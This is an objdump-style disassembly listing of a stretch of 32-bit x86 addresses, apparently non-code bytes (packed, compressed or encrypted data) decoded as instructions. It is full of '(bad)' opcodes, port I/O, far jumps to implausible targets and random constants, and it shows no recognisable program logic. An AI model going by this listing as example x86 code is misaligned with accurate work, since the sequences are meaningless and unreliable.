  420729:	hlt    
  42072a:	cmp    eax,0x31108e6
  42072f:	adc    bl,0x78
  420732:	aam    0x87
  420734:	push   cs
  420735:	push   ecx
  420736:	lods   al,BYTE PTR ds:[esi]
  420737:	mov    ds:0x57d544b8,al
  42073c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42073d:	sbb    ch,BYTE PTR [ebp-0x1888187b]
  420743:	add    eax,0xb7595d94
  420748:	sub    BYTE PTR [ebx+0x4f],al
  42074b:	mov    ch,0x6
  42074d:	mov    ebx,DWORD PTR [edi-0x638522af]
  420753:	stos   BYTE PTR es:[edi],al
  420754:	xchg   BYTE PTR [edi+0x3],ch
  420757:	inc    ebp
  420758:	push   ebx
  420759:	push   esi
  42075a:	jno    0x4207b0
  42075c:	bound  eax,QWORD PTR [ecx+0x6a]
  42075f:	jg     0x42079a
  420761:	mov    dl,0x38
  420763:	or     BYTE PTR [edx+0x6e21993d],al
  420769:	inc    ecx
  42076a:	xchg   esi,eax
  42076b:	jbe    0x4207a4
  42076d:	call   0x3bcda3ac
  420772:	and    al,0x2a
  420774:	cmp    eax,0xf15f24c3
  420779:	mov    bh,0x38
  42077b:	pop    edx
  42077c:	cwde   
  42077d:	dec    ebx
  42077e:	sbb    al,BYTE PTR [edi+ebp*2]
  420781:	dec    eax
  420782:	(bad)  
  420783:	sub    ah,ah
  420785:	bound  edx,QWORD PTR [ecx-0x42e9cc22]
  42078b:	ret    0x1af5
  42078e:	fld    QWORD PTR [ebx-0x1213803a]
  420794:	stos   DWORD PTR es:[edi],eax
  420795:	lea    esp,[eax+0x49]
  420798:	push   esp
  420799:	aad    0x57
  42079b:	nop
  42079c:	xor    DWORD PTR [esi+0x5a0cbf79],0xffffffae
  4207a3:	jmp    0x3008e5a5
  4207a8:	call   FWORD PTR [ebp-0x7d]
  4207ab:	aas    
  4207ac:	ja     0x42077b
  4207ae:	sar    BYTE PTR [edi],cl
  4207b0:	push   0x1f
  4207b2:	test   eax,0x95473eea
  4207b7:	test   DWORD PTR [ebp+esi*4-0x33],esi
  4207bb:	jge    0x4207de
  4207bd:	mov    BYTE PTR [esi],dl
  4207bf:	or     eax,0x12886d8f
  4207c4:	jl     0x420829
  4207c6:	in     eax,dx
  4207c7:	push   0xffffff9d
  4207c9:	mov    ecx,0xb17da0b0
  4207ce:	cmc    
  4207cf:	test   esi,0x4100b588
  4207d5:	push   cs
  4207d6:	mov    ds:0x27576af3,eax
  4207db:	inc    ecx
  4207dc:	in     eax,0x26
  4207de:	dec    ebx
  4207df:	xor    bl,BYTE PTR [ebx+0x1f]
  4207e2:	cdq    
  4207e3:	and    eax,0xf2f87438
  4207e8:	pop    es
  4207e9:	xchg   edx,eax
  4207ea:	dec    ecx
  4207eb:	push   ecx
  4207ec:	xlat   BYTE PTR ds:[ebx]
  4207ed:	mov    eax,0x54c72aa1
  4207f2:	jecxz  0x4207a7
  4207f4:	xchg   edi,eax
  4207f5:	bound  eax,QWORD PTR [edx-0x3b]
  4207f8:	mov    edx,0x4ed077da
  4207fd:	pop    ebp
  4207fe:	sub    al,0x70
  420800:	aad    0xfc
  420802:	push   0x76227705
  420807:	mov    al,0xb5
  420809:	fst    QWORD PTR [esi-0x7e]
  42080c:	sbb    al,0xc5
  42080e:	add    al,0x60
  420810:	int    0x11
  420812:	neg    BYTE PTR [ecx-0x77]
  420815:	adc    DWORD PTR [edi+0x42631c24],esp
  42081b:	daa    
  42081c:	pop    ebp
  42081d:	scas   eax,DWORD PTR es:[edi]
  42081e:	mov    es,WORD PTR [eax]
	...
  420828:	add    BYTE PTR [eax],al
  42082a:	inc    esp
  42082b:	dec    ebp
  42082c:	dec    edx
  42082d:	dec    ebx
  42082e:	dec    ebx
  42082f:	dec    edi
  420830:	inc    ebp
  420831:	dec    edi
  420832:	sub    eax,0x9d04921e
  420837:	lods   al,BYTE PTR ds:[esi]
  420838:	outs   dx,BYTE PTR ds:[esi]
  420839:	xchg   ebp,eax
  42083a:	inc    esp
  42083b:	xchg   edi,eax
  42083c:	add    DWORD PTR [eax],eax
  42083e:	jge    0x420846
  420840:	add    BYTE PTR [eax],al
  420842:	pop    ss
  420843:	xchg   edx,eax
  420844:	sahf   
  420845:	stos   BYTE PTR es:[edi],al
  420846:	in     eax,dx
  420847:	xor    DWORD PTR [eax+0x2e2e96c7],esi
  42084d:	push   edx
  42084e:	fist   DWORD PTR [edx]
  420850:	fs data16 mov al,0xb3
  420854:	lods   al,BYTE PTR ds:[esi]
  420855:	add    ch,BYTE PTR [edx+0x2a]
  420858:	fs sysenter 
  42085b:	xchg   bh,bh
  42085d:	mov    esp,0x5b839150
  420862:	pop    ss
  420863:	mov    es,WORD PTR [edi+0x66]
  420866:	int3   
  420867:	jne    0x4208e2
  420869:	push   edi
  42086a:	aam    0xc7
  42086c:	fist   DWORD PTR [edi-0x18]
  42086f:	inc    ebx
  420870:	cwde   
  420871:	xchg   bl,ah
  420873:	out    0x8e,al
  420875:	adc    dl,BYTE PTR [ebx]
  420877:	mov    al,ds:0x4d84aa77
  42087c:	jae    0x4208ca
  42087e:	cwde   
  42087f:	xchg   edi,eax
  420880:	icebp  
  420881:	inc    ebx
  420882:	jb     0x420857
  420884:	inc    edx
  420885:	std    
  420886:	add    dh,BYTE PTR [edx+0x5b4aea04]
  42088c:	in     eax,0x88
  42088e:	ins    DWORD PTR es:[edi],dx
  42088f:	pop    edi
  420890:	dec    esi
  420891:	or     eax,0x159f12e4
  420896:	cmp    eax,0x7c5796a3
  42089b:	lds    ebx,FWORD PTR [esi]
  42089d:	in     eax,dx
  42089e:	call   0xdba05dbd
  4208a3:	neg    edi
  4208a5:	cmp    dh,BYTE PTR [ebx+0x33]
  4208a8:	push   ds
  4208a9:	sub    eax,0xc9eb1bf6
  4208ae:	test   eax,0xa9299272
  4208b3:	outs   dx,BYTE PTR ds:[esi]
  4208b4:	shl    BYTE PTR [esi+0x1],0x5a
  4208b8:	pop    ss
  4208b9:	or     edi,DWORD PTR [ecx-0x217c07c5]
  4208bf:	dec    eax
  4208c0:	adc    DWORD PTR [edx],ebp
  4208c2:	or     ah,dl
  4208c4:	iret   
  4208c5:	jb     0x4208ff
  4208c7:	sub    esi,DWORD PTR [ecx+0x300fef72]
  4208cd:	arpl   WORD PTR [eax],cx
  4208cf:	mov    WORD PTR [eax+eax*8],cs
  4208d2:	dec    ebx
  4208d3:	(bad)
  4208d6:	inc    esp
  4208d7:	cdq    
  4208d8:	(bad)  
  4208d9:	(bad)  
  4208da:	test   BYTE PTR [edi],dl
  4208dc:	push   ebx
  4208dd:	addr16 dec eax
  4208df:	xor    bh,ah
  4208e1:	stc    
  4208e2:	cs sub ecx,esp
  4208e5:	xchg   esp,eax
  4208e6:	xor    esi,eax
  4208e8:	xchg   esp,eax
  4208e9:	outs   dx,DWORD PTR ds:[esi]
  4208ea:	js     0x4208c8
  4208ec:	punpcklwd mm7,DWORD PTR [eax]
  4208ef:	stos   DWORD PTR es:[edi],eax
  4208f0:	(bad)  
  4208f1:	fst    DWORD PTR [esi-0x1d]
  4208f4:	xor    BYTE PTR [edx+0x6a509953],0xe2
  4208fb:	add    eax,0x3178787e
  420900:	scas   al,BYTE PTR es:[edi]
  420901:	jns    0x4208e2
  420903:	(bad)  
  420905:	leave  
  420906:	cdq    
  420907:	scas   al,BYTE PTR es:[edi]
  420908:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  42090a:	mov    DWORD PTR [esi+0x666149c5],0x50c8faa3
  420914:	sbb    BYTE PTR [ebx+0x110106cc],cl
  42091a:	cli    
  42091b:	mov    edx,0x6fd116d5
  420920:	in     eax,dx
  420921:	test   eax,0x3b1f8bfa
  420926:	mov    edx,0xc350641d
  42092b:	scas   al,BYTE PTR es:[edi]
  42092c:	xchg   edi,eax
  42092d:	dec    eax
  42092e:	leave  
  42092f:	adc    BYTE PTR [esi],cl
  420931:	and    eax,0xb9c55a07
  420936:	outs   dx,DWORD PTR ds:[esi]
  420937:	push   ebp
  420938:	push   ss
  420939:	mov    ds:0x3497317,eax
  42093e:	leave  
  42093f:	mov    eax,ds:0xf04c9893
  420944:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420945:	ds int 0xa1
  420948:	xor    DWORD PTR [edx+0x55],0xfffffffe
  42094c:	not    ebp
  42094e:	add    DWORD PTR [esi+0x58],ecx
  420951:	adc    ah,BYTE PTR [edi]
  420953:	and    DWORD PTR [ebx+0x7a],ecx
  420956:	xor    DWORD PTR [edi],ebp
  420958:	aam    0x5
  42095a:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  42095c:	ins    DWORD PTR es:[edi],dx
  42095d:	imul   ecx,eax,0x52
  420960:	out    0xa0,eax
  420962:	dec    edx
  420963:	ror    BYTE PTR [edx-0x137afc67],cl
  420969:	mov    ds:0x6eb1976e,al
  42096e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42096f:	mov    esp,0xd9c12437
  420974:	sub    eax,0xa79264cf
  420979:	push   ebx
  42097a:	call   0xba:0xa5dbd346
  420981:	pop    ebx
  420982:	push   ss
  420983:	retf   
  420984:	call   DWORD PTR [eax+0x3b]
  420987:	rcr    DWORD PTR [edx-0xde0d4fd],0xa5
  42098e:	or     eax,0x3c1b9c48
  420993:	fwait
  420994:	pop    edi
  420995:	aam    0xdf
  420997:	out    dx,eax
  420998:	mov    BYTE PTR [edi+0x23f9410a],dl
  42099e:	cs cmc 
  4209a0:	inc    ecx
  4209a1:	iret   
  4209a2:	das    
  4209a3:	adc    ch,BYTE PTR [ebx*2-0x530db213]
  4209aa:	stos   BYTE PTR es:[edi],al
  4209ab:	mov    al,ds:0x3efcaeb5
  4209b0:	loope  0x420a10
  4209b2:	fs mov di,cx
  4209b6:	xchg   BYTE PTR [esi+0x59],ch
  4209b9:	jl     0x420a2d
  4209bb:	out    0x58,al
  4209bd:	fild   DWORD PTR [edx-0x3dcb73ad]
  4209c3:	xchg   esp,eax
  4209c4:	test   al,0x93
  4209c6:	jo     0x42096e
  4209c8:	dec    edi
  4209c9:	sbb    ch,BYTE PTR [ecx+0x7d50a6bf]
  4209cf:	cld    
  4209d0:	gs aad 0xc2
  4209d3:	and    DWORD PTR [ecx],0x4
  4209d6:	jl     0x420a56
  4209d8:	std    
  4209d9:	sub    eax,0x2df63f10
  4209de:	test   BYTE PTR [edx+0xe585986],dh
  4209e4:	jne    0x4209db
  4209e6:	das    
  4209e7:	adc    DWORD PTR [edi+0x7ebc65d1],edi
  4209ed:	xchg   BYTE PTR [ebx],dl
  4209ef:	xchg   esi,eax
  4209f0:	sbb    DWORD PTR [edi+0x2f],eax
  4209f3:	sub    BYTE PTR [eax+0x1d],ch
  4209f6:	arpl   WORD PTR [esi],si
  4209f8:	retf   
  4209f9:	cmp    bh,BYTE PTR [edx]
  4209fb:	lods   al,BYTE PTR ds:[esi]
  4209fc:	gs sbb al,0x3
  4209ff:	push   edx
  420a00:	std    
  420a01:	fadd   st(5),st
  420a03:	mov    bl,0xd9
  420a05:	pop    eax
  420a06:	xchg   ebp,eax
  420a07:	mov    dh,0x7f
  420a09:	sar    bh,cl
  420a0b:	ret    0x6740
  420a0e:	push   esi
  420a0f:	bound  ebx,QWORD PTR [eax+0x72]
  420a12:	add    al,0x58
  420a14:	mov    eax,0xd8b23562
  420a19:	push   esi
  420a1a:	pop    ebp
  420a1b:	shl    ebp,1
  420a1d:	xor    cl,ch
  420a1f:	aad    0x1b
  420a21:	pop    ds
  420a22:	and    ebx,DWORD PTR [eax+eiz*4]
  420a25:	mov    ecx,0xf0f9431
  420a2a:	or     al,0xb4
  420a2c:	push   cs
  420a2d:	mov    edx,DWORD PTR [edx+0xe817fae]
  420a33:	dec    eax
  420a34:	jno    0x420a32
  420a36:	sub    ch,bl
  420a38:	jecxz  0x420a1b
  420a3a:	cmp    eax,0xc4c5061c
  420a3f:	add    BYTE PTR [eax+0x3],bh
  420a42:	inc    esi
  420a43:	fisttp DWORD PTR [esi+0x1b]
  420a46:	sub    BYTE PTR [ecx-0x19],dh
  420a49:	mov    BYTE PTR [edx],bl
  420a4b:	inc    edx
  420a4c:	adc    dl,dl
  420a4e:	outs   dx,DWORD PTR ds:[esi]
  420a4f:	pop    ecx
  420a50:	call   0xb39fc0dc
  420a55:	neg    DWORD PTR [edi]
  420a57:	btr    DWORD PTR [edi+0x2e],ecx
  420a5b:	sub    ecx,esp
  420a5d:	jmp    0x420a42
  420a5f:	ret    0x872e
  420a62:	sbb    DWORD PTR [ebx+0x7aeaf657],eax
  420a68:	or     BYTE PTR [ebx+ebx*4+0x78a6b9d5],dl
  420a6f:	data16 sbb BYTE PTR ds:0xacf80f68,cl
  420a76:	mov    ebp,0xa755acf1
  420a7b:	mov    dl,0x61
  420a7d:	dec    eax
  420a7e:	in     al,dx
  420a7f:	jb     0x420a7f
  420a81:	pop    es
  420a82:	rcr    DWORD PTR [ecx+0x3c],cl
  420a85:	sbb    al,0x71
  420a87:	je     0x420ae2
  420a89:	(bad)  
  420a8a:	bound  esp,QWORD PTR [edi+ecx*1]
  420a8d:	xchg   edi,eax
  420a8e:	fwait
  420a8f:	xchg   ebx,eax
  420a90:	add    BYTE PTR [edi],bh
  420a92:	pop    esi
  420a93:	(bad)  
  420a94:	cli    
  420a95:	and    BYTE PTR ds:0x4445b43f,al
  420a9b:	jecxz  0x420b05
  420a9d:	sbb    BYTE PTR [ebx+ebp*1],ch
  420aa0:	mov    edx,esp
  420aa2:	mov    al,0x4d
  420aa4:	dec    esi
  420aa5:	and    dl,bh
  420aa7:	xor    eax,0xebb6cedd
  420aac:	aam    0x12
  420aae:	je     0x420a73
  420ab0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420ab1:	(bad)  
  420ab2:	stos   DWORD PTR es:[edi],eax
  420ab3:	mov    cl,dh
  420ab5:	mov    WORD PTR ds:0x5a6ffdd,?
  420abb:	inc    ebp
  420abc:	icebp  
  420abd:	sub    cl,ah
  420abf:	jecxz  0x420abd
  420ac1:	in     eax,0x40
  420ac3:	and    DWORD PTR [eax+eax*1-0x7305cf34],eax
  420aca:	rol    DWORD PTR [esi-0x2ec89f30],1
  420ad0:	ret    0x8e7e
  420ad3:	pop    ecx
  420ad4:	push   eax
  420ad5:	add    eax,0x68e49946
  420ada:	xchg   ebp,eax
  420adb:	stos   BYTE PTR es:[edi],al
  420adc:	fs mov al,0x1f
  420adf:	xchg   ebp,eax
  420ae0:	mov    esi,?
  420ae2:	fidivr DWORD PTR [esi-0x76]
  420ae5:	xor    cl,BYTE PTR [ebp-0x5f]
  420ae8:	mov    db5,ebp
  420aeb:	aaa    
  420aec:	int    0x37
  420aee:	mov    eax,0xc901f061
  420af3:	lock pop ss
  420af5:	pop    ss
  420af6:	ret    0x6144
  420af9:	int    0x61
  420afb:	inc    ebx
  420afc:	xchg   edi,eax
  420afd:	pop    eax
  420afe:	push   ds
  420aff:	and    DWORD PTR [bx+si],edi
  420b02:	fistp  QWORD PTR [edx-0x552d42e2]
  420b08:	xchg   ebx,eax
  420b09:	in     eax,dx
  420b0a:	dec    edi
  420b0b:	dec    esp
  420b0c:	dec    ebp
  420b0d:	cmp    BYTE PTR ss:[edx-0x392d1a26],0x8a
  420b15:	int3   
  420b16:	pop    ebp
  420b17:	and    eax,0x56b7d03d
  420b1c:	push   edx
  420b1d:	xchg   DWORD PTR [esp+ebp*1+0x63],edi
  420b21:	sbb    al,0x1f
  420b23:	lock mov eax,DWORD PTR ds:0x80a39282
  420b2a:	cmp    eax,ebx
  420b2c:	jb     0x420b2b
  420b2e:	sbb    eax,0xec29891d
  420b33:	push   ecx
  420b34:	imul   esi,DWORD PTR [eax+0x2eb14811],0xfb6c40ca
  420b3e:	pop    es
  420b3f:	jo     0x420b46
  420b41:	mov    ch,0xf9
  420b43:	in     al,dx
  420b44:	jne    0x420bbd
  420b46:	fwait
  420b47:	mov    edi,0xeccc72f6
  420b4c:	inc    bl
  420b4e:	(bad)  
  420b4f:	leave  
  420b50:	mov    edx,DWORD PTR [edi-0x387dcd80]
  420b56:	mov    ds:0x2ad16dd6,al
  420b5b:	rol    BYTE PTR [edi+0x4a5a5e56],1
  420b61:	test   al,0x48
  420b63:	mov    edi,0x41b621f0
  420b68:	push   ebx
  420b69:	jbe    0x420b10
  420b6b:	(bad)
  420b6f:	push   ebx
  420b70:	(bad)  
  420b71:	ja     0x420bed
  420b73:	and    esp,DWORD PTR [ecx]
  420b75:	and    DWORD PTR [edx+0xd47cdf8],0xffffffb0
  420b7c:	xlat   BYTE PTR ds:[ebx]
  420b7d:	xchg   ebx,eax
  420b7e:	loope  0x420b7b
  420b80:	repz adc DWORD PTR [edx-0x4e],esi
  420b84:	cmp    eax,0xff693da6
  420b89:	adc    dh,BYTE PTR [edx+0x24edec64]
  420b8f:	lods   al,BYTE PTR ds:[si]
  420b91:	xchg   ebx,eax
  420b92:	jne    0x420bbe
  420b94:	outs   dx,DWORD PTR ds:[esi]
  420b95:	mov    BYTE PTR [ebx+ecx*4-0x7a6a87e1],bh
  420b9c:	les    eax,FWORD PTR [esi+0x35]
  420b9f:	mov    ch,0xcb
  420ba1:	fmul   QWORD PTR [edi-0x5bd31ee5]
  420ba7:	test   al,dh
  420ba9:	pop    ds
  420baa:	pop    ds
  420bab:	adc    DWORD PTR [ebx],ebx
  420bad:	xchg   edx,eax
  420bae:	push   esp
  420baf:	sub    al,0x86
  420bb1:	xchg   esp,eax
  420bb2:	add    ecx,ebx
  420bb4:	cld    
  420bb5:	sub    eax,0xf2d7f29c
  420bba:	jmp    0x35da5df7
  420bbf:	jmp    0x5baa4ae9
  420bc4:	mov    ds:0x9bff8d3f,al
  420bc9:	add    DWORD PTR [edx+ecx*2-0x1],eax
  420bcd:	fisttp WORD PTR [eax+0x317bb0e5]
  420bd3:	idiv   DWORD PTR [edx+0x3491e2a3]
  420bd9:	adc    DWORD PTR [ecx+esi*8],ebp
  420bdc:	fist   DWORD PTR [edi]
  420bde:	rol    BYTE PTR [edx-0x77],0xad
  420be2:	(bad)  
  420be3:	dec    ebp
  420be4:	or     eax,esp
  420be6:	pmulhuw mm5,QWORD PTR [ebx]
  420be9:	sbb    esp,DWORD PTR [ebp-0x71]
  420bec:	js     0x420c00
  420bee:	aam    0x99
  420bf0:	test   bl,cl
  420bf2:	in     eax,dx
  420bf3:	lock or DWORD PTR [ebp-0x5a304679],edi
  420bfa:	cmp    ebp,DWORD PTR [edx+0x1e]
  420bfd:	mov    al,0x6f
  420bff:	cmc    
  420c00:	inc    ebx
  420c01:	push   cs
  420c02:	stc    
  420c03:	arpl   WORD PTR [ebp-0x7c],bp
  420c06:	adc    edx,DWORD PTR [eax+0x12]
  420c09:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420c0a:	test   al,0x18
  420c0c:	mov    dl,0x43
  420c0e:	mul    DWORD PTR [edi-0x374ac813]
  420c14:	dec    ecx
  420c15:	pop    esp
  420c16:	gs mov eax,0xcde24631
  420c1c:	mov    ah,0x7f
  420c1e:	jmp    0xe133c4e9
  420c23:	lods   eax,DWORD PTR fs:[esi]
  420c25:	shr    BYTE PTR [ebx+eax*1],1
  420c28:	shl    DWORD PTR [edx+esi*2+0x49],1
  420c2c:	(bad)  
  420c2d:	test   al,0xee
  420c2f:	jo     0x420c0a
  420c31:	add    al,0x1f
  420c33:	cmp    BYTE PTR [esi-0x551cf473],cl
  420c39:	or     BYTE PTR [edi],dh
  420c3b:	and    DWORD PTR [eax],ebx
  420c3d:	jbe    0x420c48
  420c3f:	std    
  420c40:	dec    eax
  420c41:	lahf   
  420c42:	call   DWORD PTR [edx+0x5]
  420c45:	ror    BYTE PTR [ecx+0x1d76d819],0xd3
  420c4c:	push   edi
  420c4d:	mov    dh,BYTE PTR [edi]
  420c4f:	fstp   DWORD PTR [ecx]
  420c51:	push   ss
  420c52:	retf   
  420c53:	rcl    esp,cl
  420c55:	pop    ebp
  420c56:	fdiv   DWORD PTR [ebx+ebp*1+0x2a]
  420c5a:	cmp    eax,0x1782647f
  420c5f:	push   ss
  420c60:	iret   
  420c61:	leave  
  420c62:	in     eax,0xfa
  420c64:	push   edi
  420c65:	adc    ch,BYTE PTR [edx]
  420c67:	sti    
  420c68:	ss push edx
  420c6a:	xlat   BYTE PTR ds:[ebx]
  420c6b:	push   DWORD PTR [ebp+0x5015d5e2]
  420c71:	jbe    0x420ce6
  420c73:	mov    ah,0xc5
  420c75:	push   ebx
  420c76:	sub    ah,cl
  420c78:	repz xchg cl,bl
  420c7b:	add    al,0xc1
  420c7d:	sbb    esp,ebx
  420c7f:	xor    DWORD PTR [ecx+0x7dcf9d8c],esp
  420c85:	cli    
  420c86:	fcomp  DWORD PTR [ecx]
  420c88:	push   0xed4c706e
  420c8d:	or     DWORD PTR [edx+ebp*2+0x282893b],esp
  420c94:	fcom   DWORD PTR [esi]
  420c96:	and    edi,eax
  420c98:	(bad)  
  420c99:	sbb    eax,0xad3b4eda
  420c9e:	mov    WORD PTR [esi],fs
  420ca0:	xchg   BYTE PTR es:0x22ffc58,ch
  420ca7:	in     al,0x4
  420ca9:	enter  0x9902,0x5a
  420cad:	ins    DWORD PTR es:[edi],dx
  420cae:	imul   esp,DWORD PTR [ecx],0x11
  420cb1:	push   es
  420cb2:	xor    DWORD PTR [esi+0x4a0fd4e2],esp
  420cb8:	or     DWORD PTR [ecx+edi*8+0x5d],edx
  420cbc:	add    bl,cl
  420cbe:	imul   ecx,DWORD PTR [eax-0x68ee3f64],0x76543841
  420cc8:	sbb    ch,cl
  420cca:	mov    edi,0x904461ff
  420ccf:	test   al,0x89
  420cd1:	test   eax,0x4c9b1e4c
  420cd6:	cmp    al,0x42
  420cd8:	pop    ds
  420cd9:	mov    bl,0xa6
  420cdb:	stos   DWORD PTR es:[edi],eax
  420cdc:	sbb    bh,BYTE PTR [ebx+ecx*1+0xd]
  420ce0:	js     0x420c81
  420ce2:	jg     0x420d5b
  420ce4:	(bad)  
  420ce5:	scas   eax,DWORD PTR es:[edi]
  420ce6:	lods   al,BYTE PTR ds:[esi]
  420ce7:	xchg   BYTE PTR [esi+0x34],cl
  420cea:	mov    al,0x49
  420cec:	jo     0x420ccf
  420cee:	xor    BYTE PTR [ebx],bl
  420cf0:	imul   eax,DWORD PTR [esi-0x7f],0x64f655b
  420cf7:	inc    edi
  420cf8:	pop    edx
  420cf9:	mov    ds:0x7dd30a72,al
  420cfe:	lds    esi,FWORD PTR ds:0x3e189332
  420d04:	daa    
  420d05:	in     al,0x0
  420d07:	idiv   DWORD PTR ds:0xa8bab5ca
  420d0d:	mov    ah,0x6e
  420d0f:	loopne 0x420d7b
  420d11:	push   ss
  420d12:	pop    ebx
  420d13:	in     eax,0xde
  420d15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420d16:	sub    cl,BYTE PTR [esi]
  420d18:	push   esi
  420d19:	jne    0x420d98
  420d1b:	loopne 0x420cab
  420d1d:	outs   dx,DWORD PTR es:[esi]
  420d1f:	repnz adc al,0xa3
  420d22:	xchg   ebp,eax
  420d23:	andnps xmm3,XMMWORD PTR [edx+0x49]
  420d27:	shl    BYTE PTR [esi+esi*4+0x3e57d549],cl
  420d2e:	jo     0x420d30
  420d30:	js     0x420d09
  420d32:	mov    ebx,0xcf2e6e22
  420d37:	xor    al,0x76
  420d39:	mov    al,ds:0x8aaf6590
  420d3e:	cmp    BYTE PTR [eax],bl
  420d40:	mov    ss,esi
  420d42:	push   cs
  420d43:	cwde   
  420d44:	call   0x8915127e
  420d49:	xor    al,0x26
  420d4b:	mov    ebp,0xe621068f
  420d50:	jle    0x420d01
  420d52:	xor    eax,0x139378db
  420d57:	mov    al,BYTE PTR [ebp+ebp*2-0x63]
  420d5b:	pmullw mm0,mm4
  420d5e:	addr16 mov ah,0x48
  420d61:	or     BYTE PTR [ebx+0x1a],ah
  420d64:	mov    bh,ah
  420d66:	or     ah,ch
  420d68:	das    
  420d69:	ret    0x9b5f
  420d6c:	dec    eax
  420d6d:	or     DWORD PTR [edi],ebx
  420d6f:	mov    ebx,DWORD PTR [edx-0x3a]
  420d72:	dec    ebx
  420d73:	sahf   
  420d74:	dec    ebx
  420d75:	fnstsw WORD PTR [edi-0x5e9590d3]
  420d7b:	out    dx,eax
  420d7c:	push   ss
  420d7d:	nop
  420d7e:	jns    0x420d58
  420d80:	xor    BYTE PTR [edx+edx*1],dh
  420d83:	sar    BYTE PTR [ebp+edi*1-0x7f],cl
  420d87:	fsubrp st(2),st
  420d89:	mov    ds:0xb8f59c5c,al
  420d8e:	fisub  WORD PTR ds:0x4952affa
  420d94:	leave  
  420d95:	mov    edx,DWORD PTR [ebx]
  420d97:	aas    
  420d98:	add    ah,BYTE PTR [eax+0x33ae5a95]
  420d9e:	mov    eax,0xa29838a3
  420da3:	cwde   
  420da4:	rcr    DWORD PTR [ecx-0x62e08575],0x5a
  420dab:	pop    edx
  420dac:	div    ecx
  420dae:	push   esp
  420daf:	lea    edi,[eax-0x5c]
  420db2:	mov    edx,DWORD PTR [ebx+0x6b6c6963]
  420db8:	dec    eax
  420db9:	mov    ds:0x9be9a5b6,eax
  420dbe:	pop    edi
  420dbf:	pop    edi
  420dc0:	jge    0x420db7
  420dc2:	in     eax,0x1b
  420dc4:	or     ah,BYTE PTR [eax+0x55]
  420dc7:	test   DWORD PTR [eax],ebp
  420dc9:	pop    edx
  420dca:	es inc esp
  420dcc:	stc    
  420dcd:	fwait
  420dce:	enter  0x4a53,0x90
  420dd2:	push   eax
  420dd3:	ins    DWORD PTR es:[edi],dx
  420dd4:	mov    bl,0x34
  420dd6:	lods   al,BYTE PTR ds:[esi]
  420dd7:	dec    ecx
  420dd8:	sub    cl,BYTE PTR [esi+0x60]
  420ddb:	call   0x8e0d:0x4ba7d0f7
  420de2:	icebp  
  420de3:	ret    
  420de4:	cdq    
  420de5:	imul   edi,DWORD PTR [eax],0xda25bf32
  420deb:	cli    
  420dec:	adc    edi,DWORD PTR [eax-0x1c]
  420def:	and    edx,0x19fe6276
  420df5:	addr16 rcl dl,cl
  420df8:	mov    bl,0x44
  420dfa:	aam    0x31
  420dfc:	(bad)  
  420dfd:	sbb    bl,BYTE PTR [ebp+0x1e]
  420e00:	jns    0x420e06
  420e02:	sub    ebx,ebp
  420e04:	and    BYTE PTR [esi-0x6e],ah
  420e07:	adc    al,0xdd
  420e09:	jecxz  0x420da5
  420e0b:	cmp    edi,esi
  420e0d:	jg     0x420de3
  420e0f:	or     eax,0x684d91e7
  420e14:	mov    BYTE PTR ds:0xac2847b7,bh
  420e1a:	pusha  
  420e1b:	lods   eax,DWORD PTR fs:[esi]
  420e1d:	popa   
  420e1e:	dec    ecx
  420e1f:	and    ch,BYTE PTR ds:[edi]
  420e22:	shr    BYTE PTR [ebx],cl
  420e24:	inc    ebp
  420e25:	into   
  420e26:	mov    ebx,0x4253ac76
  420e2b:	sbb    dh,BYTE PTR [edi]
  420e2d:	(bad)  
  420e2e:	adc    BYTE PTR [ebx-0x72],dh
  420e31:	and    al,0x8c
  420e33:	or     ah,BYTE PTR [esi]
  420e35:	mov    dl,0xb4
  420e37:	lods   al,BYTE PTR ds:[esi]
  420e38:	out    0xb8,al
  420e3a:	cdq    
  420e3b:	mov    ebp,0x45b5d183
  420e40:	and    dh,BYTE PTR [edi-0x7399d3a0]
  420e46:	(bad)  
  420e48:	mov    WORD PTR [ebx+0x71],ds
  420e4b:	jns    0x420ec7
  420e4d:	stos   BYTE PTR es:[edi],al
  420e4e:	fisubr WORD PTR [edi-0x75cfa1d2]
  420e54:	xor    BYTE PTR [esi+ebp*2-0x40],al
  420e58:	mov    DWORD PTR [edx+0x55],esp
  420e5b:	dec    edx
  420e5c:	inc    ebx
  420e5d:	xchg   ebx,eax
  420e5e:	push   eax
  420e5f:	lock inc esp
  420e61:	ror    BYTE PTR [bp+di],cl
  420e64:	loope  0x420df0
  420e66:	pop    ebx
  420e67:	mov    al,0x4b
  420e69:	mov    es,edx
  420e6b:	pop    eax
  420e6c:	jnp    0x420ec8
  420e6e:	imul   edx,edx,0x5a071f96
  420e74:	mov    ch,0x32
  420e76:	xchg   ecx,eax
  420e77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420e78:	jbe    0x420e25
  420e7a:	test   DWORD PTR [ebx],0xd2ee83fc
  420e80:	push   edi
  420e81:	fcomip st,st(5)
  420e83:	sti    
  420e84:	mov    esp,0xd4f4c68e
  420e89:	test   eax,0x775b2a31
  420e8e:	sub    eax,0x3737052e
  420e93:	dec    ebp
  420e94:	lea    edi,[ecx-0x5c]
  420e97:	ins    BYTE PTR es:[edi],dx
  420e98:	das    
  420e99:	xchg   edx,eax
  420e9a:	(bad)  
  420e9b:	mov    ebp,DWORD PTR [edi-0x586163a9]
  420ea1:	(bad)  
  420ea2:	sahf   
  420ea3:	out    0xbf,eax
  420ea5:	inc    eax
  420ea6:	push   edx
  420ea7:	push   0xffffffa5
  420ea9:	adc    eax,0xd2d9ac39
  420eae:	bound  ecx,QWORD PTR [ebx-0x7a695323]
  420eb4:	sbb    esi,esi
  420eb6:	pop    es
  420eb7:	xlat   BYTE PTR ds:[ebx]
  420eb8:	xchg   edx,eax
  420eb9:	xor    edx,esp
  420ebb:	sbb    BYTE PTR [ecx+0x33],al
  420ebe:	in     al,dx
	...
  420ec7:	add    BYTE PTR [eax],al
  420ec9:	add    BYTE PTR [ebp+0x48],dl
  420ecc:	inc    edx
  420ecd:	push   ebp
  420ece:	pop    edi
  420ecf:	pop    edi
  420ed0:	push   edi
  420ed1:	dec    eax
  420ed2:	cmp    BYTE PTR [esi-0x14],bh
